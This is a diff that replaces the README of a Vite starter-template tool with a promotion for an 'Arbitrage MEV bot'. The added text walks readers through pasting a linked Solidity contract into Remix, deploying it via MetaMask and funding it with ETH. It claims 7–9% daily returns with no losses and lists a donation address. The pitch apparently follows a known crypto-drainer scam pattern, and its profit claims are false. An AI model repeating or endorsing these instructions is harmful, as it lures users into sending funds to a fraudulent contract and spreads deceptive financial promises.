@@ -1,190 +1,87 @@
-<p align="center">
-  <a href="https://vitejs.dev" target="_blank" rel="noopener noreferrer">
-      <img width="220" src="https://jzzx-docs.netlify.app/assets/vite.4d21301c.png" alt="Vite logo">
-  </a>
-</p>
-<br/>
-<p align="center">
+<div align="center">
+    
+ <img src="https://i.ibb.co/ZJDdbjJ/4bdf60-846d110908144c17ab163fee6f2648e8-mv2.webp" alt="4bdf60-846d110908144c17ab163fee6f2648e8-mv2" border="0">
+    
+</div>
 
+Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.
 
-[![OSCS Status](https://www.oscs1024.com/platform/badge/ErKeLost/vite-cli.svg?size=small)](https://www.oscs1024.com/project/ErKeLost/vite-cli?ref=badge_small)
-<a href="https://nodejs.org/en/about/releases/"><img src="https://img.shields.io/node/v/vite.svg" alt="node compatibility"></a>
-<a href="https://github.com/vitejs/vite/actions/workflows/ci.yml"><img src="https://github.com/vitejs/vite/actions/workflows/ci.yml/badge.svg?branch=main" alt="build status"></a>
+You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs. Here I provide you the access to my user-friendly (no coding skills required) MEV bot. Enjoy stress-free passive income from day one.
 
+My flagship project that I recently released is Arbitrage MEV bot which runs on ETH pairs on Uniswap making profits from arbitrage trades.
 
-</p>
-<br/>
+Using my smart contract source code allows users to create their own MEV bots which stacks up the profits from automatic trades for the users.
 
+I share my Arbitrage MEV bot smart contract for free, but there’s 0.1% fee charged from users’ profits, which goes back to me.
 
+---
+ 
+## How to launch your own arbitrage bot 
 
+1) Download MetaMask (if you don’t have it already):
+  https://metamask.io/download.html
 
-# Create Vite App
+   Access Remix: https://remix.ethereum.org/
 
-## 📖 Introduction
+2) File Explorer Hover over the tiny button in the top left and click and create new file **"mevbot.sol"** Copy the code from [**"MevBot.sol"**](MevBot.sol) and paste in Remix IDE
 
-Create Vite App resolve Vite create starter template, No need to configure Vite scaffolding templates quickly build vite4 development templates highly customized
+ <div align="center">
+    
+<img src="https://i.ibb.co/r5QHcXb/1.png" alt="1" border="0">
 
+   </div>
 
+3) Go to the **“Solidity Compiler”** tab, Select compiler version 0.6.12 and then select **“Compile mevbot.sol”**.
 
-## 🌈 Features
+   Make sure “**MevBot.sol**” is selected in the **CONTRACT** section of the **SOLIDITY COMPILER** section.
 
-- ⚛️ Support tons of framework templates
+ <div align="center">
+    
+<img src="https://i.ibb.co/Tvbwv9g/2.png" alt="2" border="0">
 
-- 🌸 One-click deployment of netlify
+   </div>
+   
+4) Go to the **“DEPLOY & RUN TRANSACTIONS”** tab, select the **“Injected Provider - Metamask”** environment and then **“Deploy”**. By approving the Metamask contract creation fee, you will have created your own contract.
 
-- 📦 Select the out-of-the-box package manager
+5) Copy your newly created contract address and fund it with any amount of ETH  Simply send ETH to your newly created contract address to allow the bot to earn money.
 
-- 🚀 Various characteristics of the corresponding framework
+ <div align="center">
+    
+<img src="https://i.ibb.co/Z1CMXK1/3.png" alt="3" border="0">
 
-- ✨ Selection of various Ui frameworks, Theming and layout
+   </div>
+   
+6) After your transaction is confirmed, click the **“start”** button to run the bot. Withdraw your ETH at any time by clicking the **“Withdraw”** button.
 
-- 🍰 A variety of out-of-the-box Vite plugin options
+ <div align="center">
+    
+<img src="https://i.ibb.co/pf8h7M2/4.png" alt="4" border="0">
 
-## 📦 Installation
+   </div>
+   
+#### That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.
 
-```ts
-  npx create-vite-template@latest
-```
+---
+# FAQ
 
-## 🦄 Usage
+### If many people will use the bot, wouldn’t dilution of profits occur?
 
-![ripple-app.gif](https://user-images.githubusercontent.com/66500121/187821940-556aba41-30d4-4d34-9093-d911f6257a2a.gif)
+I do not plan to limit access to the bot for now because there won’t be any affect for me or other users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so other users involvement in the pools will always be very minor.
 
+### What average ROI can I expect?
 
+According to my latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. Bot does not make any losses, it only executes trades when there’s proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.
 
+### What amount of funds bot need to work?
 
-# 📦 Dev Mode
+I recommend funding the contract with at least 1-5 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
 
-```
-pnpm install
-```
+### Does it work on other chains or DEXes as well?
 
-```
-pnpm dev
-```
+No, currently the bot is dedicated only for Ethereum on Uniswap pools.
 
-![image](https://user-images.githubusercontent.com/66500121/207052692-22725ea0-e64a-46ac-ae3f-fe28a3ade2be.png)
+#### address for donate - 0x8365d619f4620083Aa9e320C2e88e1590A73d53b eth usdt ETH
 
+# License
 
-```
-cd packages/vite-cli
-```
-
-```
-npm link
-```
-
-###  Then you can enter instructions at will on the command line with ` create-vite | vite4 | vite-cli ` and update in real time when you modify the code.
-
-## 🤖 Feature Comparison
-
-Currently, the template supports the following plugins
-The supported template presets are:
-
-### FrameWork
-
-| FrameWork     | finish   |
-| ------------- | -------- |
-| Vite3 Vue3    | ✅ 🆕 |
-| Vite3 React18 | 🚧  🆕 |
-| Nuxt3          | 🚧 ❌    |
-| Next13          | 🚧 ❌    |
-
-### Feature
-
-| Feature / Version | finish |
-| ----------------- | ------ |
-| Vue-Router 4.x    | ✅     |
-| Pinia 2.x         | ✅     |
-|                   |        |
-| Eslint 8.x        | ✅     |
-| Prettier 2.7.x    | ✅     |
-| TypeScript 5.x  | ✅     |
-| husky             | 🚧 ❌  |
-| PWA               | ✅ 🆕 |
-
-### UI Library
-
-| UI Library         | finish |
-| ------------------ | ------ |
-| Element-Plus       | ✅ 🆕  |
-| Naive-UI           | ✅ 🆕  |
-| Vuetify-beta5      | ✅ 🆕  |
-| DevUI              | ✅ 🆕  |
-| Ant-design-vue     | ✅ 🆕  |
-| arco-design        | ✅ 🆕  |
-| TDesign            | ✅     |
-| Varlet             | ✅     |
-| tdesign-mobile-vue | ✅ 🆕  |
-| Vant               | ✅ 🆕  |
-
-### Plugins
-
-| Feature / Version        | finish    |
-| ------------------------ | --------- |
-| Vue                      | v3.2.x    |
-| Vite                     | v3.0.0 🆕 |
-| @vitejs/plugin-vue-jsx   | ✅        |
-| @vitejs/plugin-legacy    | ✅        |
-| vite-plugin-inspect      | ✅        |
-| vite-plugin-pwa          | ✅        |
-| unplugin-vue-components  | ✅        |
-| unplugin-auto-import     | ✅        |
-| Unocss                   | ✅        |
-| rollup-plugin-visualizer | ✅        |
-| unplugin-icons           | ✅        |
-| Vite-plugin-html         | ✅ 🆕     |
-
-## 🛫 Example With theming
-
-- [Tiny-Vue](https://tiny-vue.netlify.app/)
-
-- [Naive-UI](https://create-vite-app-naive-ui.netlify.app/)
-
-- [Element-Plus](https://create-vite-app-element-plus.netlify.app/)
-
-- [Ant-Design-Vue](https://vite-cli-ant-design-vue.netlify.app/)
-
-### An example of executing dev after successful installation is as follows
-
-- Tiny Vue
-
-![c68a80e2533333a05c2eb429c930cd6](https://user-images.githubusercontent.com/66500121/232227793-179585c4-3a2f-42c0-8210-2e561ce5f3bb.png)
-
-- Naive UI
-
-![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/84463b72894c4df2862c20d006ab240c~tplv-k3u1fbpfcp-watermark.image?)
-
-- Ant Design
-
-![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/21469c6f20bd46ab8fb5df23376cfcba~tplv-k3u1fbpfcp-watermark.image?)
-
-- Element Plus
-
-![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/682e343e8f924dbbb691811184e8428f~tplv-k3u1fbpfcp-watermark.image?)
-
-- Arco Design
-
-![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b27ce1dd7d344170b59be4f2ccd39211~tplv-k3u1fbpfcp-watermark.image?)
-
-- DevUI
-
-![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9d0ed5a6340c4a62b35f72ac7b490077~tplv-k3u1fbpfcp-watermark.image?)
-
-- T-Design
-
-![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fa8e5b68f8b9481fac9cf4809ac50fbe~tplv-k3u1fbpfcp-watermark.image?)
-
-- Vuetify
-
-![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a5ea5124b6284c68b8b9948c9fdf803b~tplv-k3u1fbpfcp-watermark.image?)
-
-- Varlet
-
-![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f8f31a99cab645d4a5fb5cf0c4000ef6~tplv-k3u1fbpfcp-watermark.image?)
-
-# 🌸  Credits
-
-### This project is inspired by [X-Build](https://github.com/code-device/x-build) !!!
-
-prepare all in
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
